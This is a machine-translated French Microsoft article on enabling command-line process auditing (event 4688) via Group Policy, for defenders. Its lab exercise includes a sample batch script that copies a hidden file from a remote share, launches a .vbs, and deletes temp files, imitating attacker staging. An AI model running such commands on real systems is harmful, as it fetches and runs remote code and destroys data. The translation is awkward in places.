---
ms.assetid: c8597cc8-bdcb-4e59-a09e-128ef5ebeaf8
title: Audit des processus de ligne de commande
description: 
author: billmath
ms.author: billmath
manager: femila
ms.date: 05/31/2017
ms.topic: article
ms.prod: windows-server-threshold
ms.technology: identity-adds
ms.openlocfilehash: 61e7a5ca2b9c00c9976e6032bb10adb1974020b0
ms.sourcegitcommit: db290fa07e9d50686667bfba3969e20377548504
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 12/12/2017
---
# <a name="command-line-process-auditing"></a>Audit des processus de ligne de commande

>S’applique à: Windows Server2016, Windows Server2012R2

**Auteur**: Justin Turner, ingénieur Support résolution Senior avec le groupe de Windows  
  
> [!NOTE]  
> Ce contenu est écrit par un ingénieur du support client Microsoft et est destiné aux administrateurs expérimentés et architectes système qui recherchent des explications techniques plus approfondies des fonctionnalités et des solutions Windows Server2012R2 que proposent généralement les rubriques sur TechNet. Toutefois, il n’a pas subi les mêmes passes, afin de la partie du langage peut sembler que moins finalisée que ce qui se trouvent généralement sur TechNet.  
  
## <a name="overview"></a>Vue d’ensemble  
  
-   L’événement d’audit de la création des processus 4688 ID inclut désormais des informations d’audit pour les processus de ligne de commande.  
  
-   Il enregistre également hachage SHA1/2 du fichier exécutable dans le journal des événements Applocker  
  
    -   Applications et des services\microsoft\windows\applocker  
  
-   Vous activez via un GPO, mais il est désactivé par défaut  
  
    -   «Inclure la ligne de commande dans les événements de création de processus»  
  
![l’audit de ligne de commande](media/Command-line-process-auditing/GTR_ADDS_Event4688.gif)  
  
**Figure SEQ Figure \\\ * ARABIC événement 16 4688**  
  
Passez en revue l’événement mis à jour 4688 ID dans REF _Ref366427278 \h Figure16.  Avant cette version aucune mise à jour des informations de **ligne de commande de processus** dans le journal.  En raison de cette journalisation supplémentaire, nous pouvons voir que non seulement le processus wscript.exe démarré, mais qu’il était également utilisé pour exécuter un script VB.  
  
## <a name="configuration"></a>Configuration  
Pour afficher les effets de cette mise à jour, vous devez activer les deux paramètres de stratégie.  
  
### <a name="you-must-have-audit-process-creation-auditing-enabled-to-see-event-id-4688"></a>Vous devez disposer de la création du processus d’Audit activé à voir l’événement 4688 ID d’audit.  
Pour activer la stratégie d’Audit de création de processus, modifiez la stratégie de groupe suivant:  
  
**Emplacement de la stratégie:** Configuration ordinateur > stratégies > paramètres Windows > paramètres de sécurité > configuration avancée d’Audit > suivi détaillé  
  
**Nom de la stratégie:** auditer la création de processus  
  
**Prise en charge sur:** Windows7 et versions ultérieures  
  
**Description/aide:**  
  
Ce paramètre de stratégie de sécurité détermine si le système d’exploitation génère des événements d’audit lors de la création d’un processus (démarrage) et le nom du programme ou de l’utilisateur qui l’a créé.  
  
Ces événements d’audit peut vous aider à comprendre comment un ordinateur est utilisé et pour suivre l’activité de l’utilisateur.  
  
Volume de l’événement: faible à moyenne, en fonction de l’utilisation du système  
  
**Par défaut:** non configuré  
  
### <a name="in-order-to-see-the-additions-to-event-id-4688-you-must-enable-the-new-policy-setting-include-command-line-in-process-creation-events"></a>Afin de voir les ajouts à l’événement 4688 ID, vous devez activer le nouveau paramètre de stratégie: inclure la ligne de commande dans les événements de création de processus  
**Table de Table SEQ \\\ * paramètre de stratégie de processus de ligne arabes commande 19**  
  
|Configuration de la stratégie|Détails|  
|------------------------|-----------|  
|**Chemin d’accès**|Création de processus administrative Templates\System\Audit|  
|**Paramètre**|**Inclure la ligne de commande dans les événements de création de processus**|  
|**Paramètre par défaut**|Non configuré (non activé)|  
|**Prise en charge sur:**|?|  
|**Description**|Ce paramètre de stratégie détermine quelles informations sont enregistrées dans les événements d’audit de sécurité lorsqu’un nouveau processus a été créé.<br /><br />Ce paramètre s’applique uniquement lorsque la stratégie d’Audit de création de processus est activée. Si vous activez ce paramètre de stratégie que les informations de ligne de commande pour chaque processus seront avoir ouvert une session en texte brut dans le journal de sécurité dans le cadre de l’événement d’Audit de création de processus 4688, «un nouveau processus a été créé,» sur les stations de travail et les serveurs sur lesquels ce paramètre de stratégie est appliqué.<br /><br />Si vous désactivez ou ne configurez pas ce paramètre de stratégie, les informations de ligne de commande du processus ne pas être incluses dans les événements d’Audit de création de processus.<br /><br />Par défaut: Non configuré<br /><br />Remarque: Lorsque ce paramètre de stratégie est activé, tout utilisateur ayant accès à lire que les événements de sécurité seront en mesure de lire les arguments de ligne de commande pour toute correctement qui créé des processus. Arguments de ligne de commande peuvent contenir des informations sensibles ou privées telles que des mots de passe ou des données utilisateur.|  
  
![l’audit de ligne de commande](media/Command-line-process-auditing/GTR_ADDS_IncludeCLISetting.gif)  
  
Lorsque vous utilisez les paramètres de Configuration de stratégie d’Audit avancée, vous devez confirmer que ces paramètres ne sont pas remplacés par les paramètres de stratégie d’audit de base.  Événement4719 est consigné lorsque les paramètres sont remplacés.  
  
![l’audit de ligne de commande](media/Command-line-process-auditing/GTR_ADDS_Event4719.gif)  
  
La procédure suivante montre comment éviter les conflits en bloquant l’application de tous les paramètres de stratégie d’audit de base.  
  
### <a name="to-ensure-that-advanced-audit-policy-configuration-settings-are-not-overwritten"></a>Pour vous assurer que les paramètres de Configuration avancée de stratégie d’Audit ne sont pas remplacés.  
![l’audit de ligne de commande](media/Command-line-process-auditing/GTR_ADDS_AdvAuditPolicy.gif)  
  
1.  Ouvrez la console de gestion de stratégie de groupe  
  
2.  Avec le bouton droit de la stratégie de domaine par défaut, puis cliquez sur Modifier.  
  
3.  Double-cliquez sur la Configuration de l’ordinateur, double-cliquez sur les stratégies, puis double-cliquez sur Paramètres Windows.  
  
4.  Double-cliquez sur paramètres de sécurité, stratégies locales, puis cliquez sur Options de sécurité.  
  
5.  Double-cliquez d’Audit: Paramètres de sous-catégorie de stratégie Force audit (WindowsVista ou version ultérieure) pour remplacer les paramètres de catégorie de stratégie d’audit, puis cliquez sur Définir ce paramètre de stratégie.  
  
6.  Cliquez sur activé, puis cliquez sur OK.  
  
## <a name="additional-resources"></a>Ressources supplémentaires  
[Création du processus d’audit](https://technet.microsoft.com/library/dd941613(v=WS.10).aspx)  
  
[Stratégie d’Audit de sécurité avancée Step-by-Step Guide](https://technet.microsoft.com/library/dd408940(v=WS.10).aspx)  
  
[AppLocker: Forum aux Questions](https://technet.microsoft.com/library/ee619725(v=ws.10).aspx)  
  
## <a name="try-this-explore-command-line-process-auditing"></a>Procédez comme suit: Explorer l’audit des processus de ligne de commande  
  
1.  Activer **la création du processus d’Audit** événements et assurez-vous que la configuration de la stratégie d’Audit avancée n’est pas remplacée.  
  
2.  Créer un script qui génère des événements d’intérêt et exécutez le script.  Observer les événements.  Voici à quoi ressemblait le script utilisé pour générer l’événement dans la leçon:  
  
    ```  
    mkdir c:\systemfiles\temp\commandandcontrol\zone\fifthward  
    copy \\192.168.1.254\c$\hidden c:\systemfiles\temp\hidden\commandandcontrol\zone\fifthward  
    start C:\systemfiles\temp\hidden\commandandcontrol\zone\fifthward\ntuserrights.vbs  
    del c:\systemfiles\temp\*.* /Q  
    ```  
  
3.  Activer l’audit des processus de ligne de commande  
  
4.  Exécuter le même script et observer les événements  
  


